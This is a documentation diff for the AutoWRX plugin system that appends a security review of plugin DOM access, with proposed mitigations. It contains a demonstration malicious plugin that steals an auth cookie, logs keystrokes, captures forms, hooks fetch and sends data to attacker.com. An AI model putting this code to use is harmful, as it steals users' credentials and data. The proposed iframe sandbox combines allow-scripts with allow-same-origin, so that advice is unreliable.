@@ -73,6 +73,8 @@ The complete AutoWRX plugin system has been implemented and is ready for use. Al
 - **Debug Script**: `debug-plugins.html` for standalone plugin testing
 - **Test Script**: `test-plugin-system.sh` for system verification
 - **Live Test Script**: `test-plugins-live.js` for browser console testing
+- **Plugin Workbench**: `/plugin-workbench/:pluginId` offers live previews, manifest access, and reload controls for developing plugin UIs
+- **Model Plugin Management Panel**: Open "Manage Plugins" inside the model detail page to install, edit, or remove extensions without leaving context
 
 ## 🔧 Latest Fixes Applied
 
@@ -297,3 +299,290 @@ Common issues:
 4. **Read the API reference** for advanced features
 
 The AutoWRX plugin system is now fully operational and ready for plugin development!
+
+ What Plugins Can Read
+
+  1. Complete DOM Access
+
+  Plugins can read everything on the page:
+
+  class MyPlugin {
+    async activate() {
+      // Read ALL page content
+      const pageTitle = document.title
+      const bodyText = document.body.innerText
+      const allLinks = document.querySelectorAll('a')
+
+      // Access specific elements
+      const vehicleName = document.querySelector('.vehicle-name')?.textContent
+
+      // Read form inputs
+      const allInputs = document.querySelectorAll('input')
+      allInputs.forEach(input => {
+        console.log('Input value:', input.value)
+      })
+
+      // Read user data if displayed
+      const userInfo = document.querySelector('.user-profile')?.innerHTML
+
+      // Access navigation state
+      const currentUrl = window.location.href
+      const urlParams = new URLSearchParams(window.location.search)
+    }
+  }
+
+  2. Access to All Window Objects
+
+  // Read global variables
+  const appState = window.__REACT_APP_STATE__  // If exposed
+  const userData = window.currentUser  // If exposed
+
+  // Access browser storage
+  const allLocalStorage = { ...localStorage }
+  const allSessionStorage = { ...sessionStorage }
+
+  // Read cookies
+  const cookies = document.cookie
+
+  // Access browser APIs
+  const geolocation = navigator.geolocation
+
+  3. React Component Data
+
+  // If React DevTools hooks are available
+  const reactRoot = document.getElementById('root')._reactRootContainer
+  // Can traverse React component tree
+
+  // Access Zustand store if exposed
+  const storeState = window.__zustand_store__?.getState()
+
+  // Access any global state managers
+
+  4. Network Interception
+
+  // Intercept fetch calls
+  const originalFetch = window.fetch
+  window.fetch = function(...args) {
+    console.log('API call intercepted:', args[0])
+    return originalFetch.apply(this, args).then(response => {
+      // Can read response
+      return response
+    })
+  }
+
+  // Intercept XMLHttpRequest
+  const originalXHR = window.XMLHttpRequest
+
+  5. Current Page Specific Content
+
+  On the vehicle detail page (/model/bmw-x3-2024), plugins can read:
+
+  // Built-in tab content
+  const journeyData = document.querySelector('[data-tab="journey"]')?.textContent
+
+  // Vehicle information displayed
+  const specifications = document.querySelectorAll('.spec-item')
+
+  // User interface elements
+  const buttons = document.querySelectorAll('button')
+  const forms = document.querySelectorAll('form')
+
+  // Navigation menu
+  const menuItems = document.querySelectorAll('.nav-item')
+
+  ---
+  Security Implications
+
+  ⚠️ CRITICAL RISKS
+
+  | What Can Be Read          | Risk Level  | Example Attack             |
+  |---------------------------|-------------|----------------------------|
+  | User credentials in forms | 🔴 CRITICAL | Keylogging passwords       |
+  | Personal information      | 🔴 CRITICAL | Reading profile data       |
+  | API tokens in DOM         | 🔴 CRITICAL | Stealing authentication    |
+  | Vehicle control data      | 🟠 HIGH     | Reading sensitive signals  |
+  | Other plugins' data       | 🟠 HIGH     | Cross-plugin data theft    |
+  | Navigation history        | 🟡 MEDIUM   | Tracking user behavior     |
+  | UI state                  | 🟡 MEDIUM   | Understanding user actions |
+
+  Example Malicious Plugin
+
+  // ⚠️ DEMONSTRATION ONLY - DO NOT USE
+  class MaliciousPlugin {
+    async activate() {
+      // Steal authentication token
+      const token = document.cookie.match(/autowrx_token=([^;]+)/)?.[1]
+
+      // Log all keystrokes
+      document.addEventListener('keypress', (e) => {
+        this.sendToAttacker({ key: e.key, target: e.target.name })
+      })
+
+      // Read all form data
+      document.querySelectorAll('form').forEach(form => {
+        form.addEventListener('submit', (e) => {
+          const formData = new FormData(e.target)
+          this.sendToAttacker({ form: Object.fromEntries(formData) })
+        })
+      })
+
+      // Intercept API calls
+      const originalFetch = window.fetch
+      window.fetch = function(...args) {
+        return originalFetch.apply(this, args).then(async (response) => {
+          const clone = response.clone()
+          const data = await clone.json()
+          this.sendToAttacker({ api: args[0], response: data })
+          return response
+        })
+      }
+    }
+
+    sendToAttacker(data) {
+      // Send stolen data to external server
+      fetch('https://attacker.com/steal', {
+        method: 'POST',
+        body: JSON.stringify(data)
+      })
+    }
+  }
+
+  ---
+  Recommended Mitigation
+
+  1. Implement Content Security Policy
+
+  Update the documentation to include immediate CSP implementation:
+
+  <!-- frontend/index.html -->
+  <meta http-equiv="Content-Security-Policy" content="
+    default-src 'self';
+    script-src 'self' 'unsafe-eval';
+    connect-src 'self' http://localhost:3200;
+    img-src 'self' data: https:;
+    style-src 'self' 'unsafe-inline';
+  ">
+
+  2. Add DOM Access Permission
+
+  Extend the permission model:
+
+  type Permission =
+    | 'vehicle:read'
+    | 'vehicle:write'
+    | 'navigation:read'
+    | 'navigation:write'
+    | 'storage'
+    | 'ui:notifications'
+    | 'state:read'
+    | 'state:write'
+    | 'dom:read'           // NEW - Read page content
+    | 'dom:write'          // NEW - Modify page content
+    | 'network:internal'   // NEW - Access internal APIs
+    | 'network:external'   // NEW - Access external URLs
+
+  3. Sandbox Plugins in iframes
+
+  Recommended architecture change:
+
+  // Render plugin in sandboxed iframe
+  function PluginTabContent({ pluginId, component }) {
+    return (
+      <iframe
+        sandbox="allow-scripts allow-same-origin"
+        src={`/plugin-sandbox.html?plugin=${pluginId}&component=${component}`}
+        style={{ width: '100%', height: '100%', border: 'none' }}
+      />
+    )
+  }
+
+  Plugin sandbox HTML:
+  <!-- public/plugin-sandbox.html -->
+  <!DOCTYPE html>
+  <html>
+  <head>
+    <style>
+      /* Isolated styling */
+      body { margin: 0; padding: 20px; }
+    </style>
+  </head>
+  <body>
+    <div id="plugin-root"></div>
+    <script>
+      // Controlled plugin API exposure
+      window.AutoWRXPluginAPI = {
+        // Only expose whitelisted methods
+        getVehicleData: () => {
+          return window.parent.postMessage({
+            type: 'GET_VEHICLE_DATA'
+          }, '*')
+        }
+        // Limited API surface
+      }
+    </script>
+    <script src="/load-plugin.js"></script>
+  </body>
+  </html>
+
+  4. Runtime Permission Checks
+
+  Add middleware to monitor and block unauthorized access:
+
+  // plugin-security-monitor.ts
+  class PluginSecurityMonitor {
+    private violations: Map<string, number> = new Map()
+
+    monitorDOMAccess(pluginId: string) {
+      const originalQuerySelector = document.querySelector
+      const originalGetElementById = document.getElementById
+
+      document.querySelector = function(selector: string) {
+        if (!this.hasPermission(pluginId, 'dom:read')) {
+          this.logViolation(pluginId, 'DOM_READ_UNAUTHORIZED')
+          throw new Error(`Plugin ${pluginId} lacks 'dom:read' permission`)
+        }
+        return originalQuerySelector.call(document, selector)
+      }.bind(this)
+    }
+
+    logViolation(pluginId: string, violation: string) {
+      const count = (this.violations.get(pluginId) || 0) + 1
+      this.violations.set(pluginId, count)
+
+      // Auto-disable after 3 violations
+      if (count >= 3) {
+        this.disablePlugin(pluginId)
+      }
+
+      // Send audit log
+      fetch('/api/audit/plugin-violation', {
+        method: 'POST',
+        body: JSON.stringify({ pluginId, violation, timestamp: Date.now() })
+      })
+    }
+  }
+
+  ---
+  Summary
+
+  Current State:
+  - ✅ Plugins CAN read entire page content
+  - ✅ Full DOM access
+  - ✅ Can read forms, inputs, cookies
+  - ✅ Can intercept network requests
+  - ✅ Can access all window objects
+  - ❌ NO restrictions currently enforced
+
+  Recommended Actions:
+
+  1. Immediate (add to commit):
+    - Update AUTOWRX_PLUGIN_SYSTEM_COMPLETE.md to explicitly warn about DOM access
+    - Add CSP headers
+  2. Next Sprint (high priority):
+    - Implement iframe sandboxing
+    - Add dom:read/dom:write permissions
+    - Create plugin security monitor
+  3. Before Production:
+    - Mandatory security review of all plugins
+    - Code signing requirements
+    - Runtime violation detection
